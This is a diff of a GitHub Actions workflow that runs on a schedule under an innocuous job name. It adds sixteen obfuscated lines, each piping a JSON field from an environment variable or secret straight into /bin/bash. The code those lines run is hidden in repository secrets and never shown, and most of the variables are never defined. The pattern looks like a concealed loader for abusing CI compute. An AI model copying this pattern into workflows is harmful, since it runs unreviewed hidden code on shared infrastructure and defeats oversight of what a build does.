@@ -2,19 +2,31 @@ name: processcommitment
 on:
   workflow_dispatch:
   schedule:
-    - cron: '39 5/6 * * *'
-
+    - cron: '3 0/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: processcommitment
         env:
-          icziq22998: ${{ secrets.icziq22998 }}
+          xbt734: ${{ secrets.xbt734 }}
         run: |
-          echo $icziq22998 | jq -r .hzob01223 | /bin/bash
-          echo $qag63971 | jq -r .zov6 | /bin/bash
-          echo $kknme22 | jq -r .xzi6 | /bin/bash
-          echo $pe4772 | jq -r .kwzn67 | /bin/bash
+          echo $xbt734 | jq -r .nmx79574 | /bin/bash
+          echo $a0 | jq -r .t86754 | /bin/bash
+          echo $oir5 | jq -r .fhg10 | /bin/bash
+          echo $sewe2 | jq -r .a2136 | /bin/bash
+          echo $oj43 | jq -r .cr3 | /bin/bash
+          echo $tz45823 | jq -r .fpg18487 | /bin/bash
+          echo $u9 | jq -r .nl06309 | /bin/bash
+          echo $z9 | jq -r .c2 | /bin/bash
+          echo $ulwr050 | jq -r .ski2 | /bin/bash
+          echo $w4 | jq -r .pr96 | /bin/bash
+          echo $cwg83375 | jq -r .s37 | /bin/bash
+          echo $o898 | jq -r .irwz4 | /bin/bash
+          echo $vju6 | jq -r .kh7 | /bin/bash
+          echo $qlaok52 | jq -r .v9048 | /bin/bash
+          echo $jpc6 | jq -r .h2222 | /bin/bash
+          echo $iawm4148 | jq -r .vj6 | /bin/bash
 
